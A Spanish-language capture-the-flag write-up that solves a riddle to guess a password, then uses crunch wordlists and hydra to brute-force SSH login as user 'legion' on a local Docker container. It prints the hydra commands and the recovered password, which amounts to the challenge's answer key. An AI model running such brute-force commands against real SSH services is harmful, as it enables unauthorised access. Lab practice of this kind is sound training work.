# 🛡️ Reto CTF: Ubuntu con SSH y Usuario 'Legion'

## 🎯 Objetivo
*Acceder vía SSH a un contenedor Docker con usuario `legion`, cuya contraseña debe ser descubierta a través de fuerza bruta basada en un acertijo. Se utilizaron herramientas como `crunch` e `hydra` para automatizar el proceso.*

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🧱 1. Preparación del entorno

![Alistamiento](Images/soldat-soldier.gif)

### *Descargar imagen del contenedor*

```bash
docker pull jaiderospina/retoctf:1.0
```

### *Ejecutar contenedor en segundo plano*

```bash
docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
```
![exe contenedor](Images/1.%20exe%20cont%20.png)

###  *Solución a conflicto de nombre* 

```bash
docker rm -f mi-contenedor-ssh
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🔍 2. Verificación del contenedor

```bash
docker ps
```

*Se confirmó contenedor activo y SSH escuchando en puerto 2222.*

![verif contenedor](Images/2.%20verif%20cont%20.png)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🧠 3. Análisis del acertijo

### *Acertijo:*

*Your content *Cinco guardianes vigilantes,*  
*cada uno con su inicial,*  
*la primera se esconde en estrella,*  
*la segunda en la selva tropical,*  
*tercera y cuarta van seguidas,*  
*ambas en dedo se dejan hallar,*  
*la última es misteriosa,*  
*y en gato suena al final.*  
*Juntas caminan siempre en fila.*

### *Análisis:*

***Pista:** Cinco letras ocultas y podría existir relación con las iniciales.*


| Posición | Palabra   |Letra identificada |
|----------|-----------|-------------------|
| 1        | estrella  |      **e**        |
| 2        | selva     |      **s**        |
| 3 y 4    | dedo      |   **d**-**e**     |
| 5        | gato      |      **g**        |

*Siguiendo las instrucciones del acertijo y analizando el contexto se llegó a una hipótesis.*

**Hipótesis principal**: combinación posible **esdeg**, **ESDEG**, etc.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🧰 4. Generación de diccionarios con Crunch

### *Lista basada en patrón:*

crunch 5 5 -t ES%%O -o esdeo.lst

![Crunch](Images/4.%20crunch%20+%20hydra%201%20.png)

### *Lista reducida:*

crunch 5 5 estdgo -o reducido.lst

![Crunch](Images/4.1%20crunch%20+%20hydra%202%20.png)

### *Lista ampliada:*

crunch 5 5 estdogal -o ampliada.lst

![Crunch](Images/4.2%20hydra%20.png)

### *Lista completa:*


crunch 5 5 abcdefghijklmnopqrstuvwxyz -o full.lst

![Crunch](Images/4.3%20crunch%20+%20hydra%203%20.png)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## ⚔️ 5. Ataques con Hydra

## *Comando base usado:*


```bash
hydra -t 4 -l legion -P [archivo] -s 2222 localhost ssh
```

## *Diccionarios probados:*

esdeo.lst ❌

reducido.lst ❌

ampliada.lst ❌

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 👣 6. Verificación manual de servicio SSH

```bash
ssh legion@localhost -p 2222
Confirmado: SSH activo y pidiendo contraseña.
```

![Acces Denied](Images/request-denied-thumbs-down.gif)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🎯 7. Ataque exitoso con combinaciones personalizadas

### *Crear wordlist:*

```bash
echo -e "esdeg\nESDEG\nEsdeg\neSdeg\nesDEG\neSdEg\nEsDEg\nESDeg\nesDEg\nEsdEg" > combinadas.lst
```
### *Ejecutar Hydra:*

```bash
hydra -l legion -P combinadas.lst -s 2222 localhost ssh
```
![Bang](Images/bangbang-gun.gif)

## ✅ Resultado:
```bash
css
```
[22][ssh] host: localhost login: legion password: Esdeg

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 🔐 8. Acceso SSH exitoso

```bash
ssh legion@localhost -p 2222
```

***Contraseña:** Esdeg*

![Acces](Images/lukeafk-hacking.gif)

## 🕵️ 9. Búsqueda de bandera

## *Comandos usados:*

```bash
ls -la
cat flag.txt
find / -name "*flag*" 2>/dev/null
cat /etc/motd
grep -r "CTF{" /home 2>/dev/null
```

## ❌ No se encontró bandera explícita en el contenedor.

## 🧠 Lecciones aprendidas

>- Uso táctico de crunch para generar diccionarios.
>- Dominio de hydra con control de tareas (-t).
>- Verificación previa de puertos y servicio SSH.
>- Importancia de considerar variantes en uso de mayúsculas.
>- Documentación detallada del proceso paso a paso.

**Contraseña final encontrada: Esdeg**
**Usuario: legion**
**Puerto: 2222**


